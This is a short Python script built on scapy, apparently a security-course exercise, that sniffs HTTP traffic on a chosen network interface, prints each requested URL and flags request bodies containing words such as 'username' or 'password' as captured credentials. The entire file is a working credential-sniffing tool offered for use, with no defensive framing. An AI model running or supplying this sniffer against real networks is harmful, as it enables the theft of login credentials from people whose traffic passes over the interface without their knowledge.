#!/usr/bin/env python
from click import argument
import scapy.all as scapy
from scapy.layers import http
import optparse


def setup():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface currently connectedused to connect to internet")
    (options, arguments) = parser.parse_args()
    if not options.interface:
            parser.error("[-] interface is required. See --help more more info ")
    return options



def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        url = get_url(packet)
        print("[+] HTTP Request" + url.decode())
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                print(f"\n\n[+] Possible username/password > {load.decode()}\n\n")
                break


options = setup()
sniff(options.interface)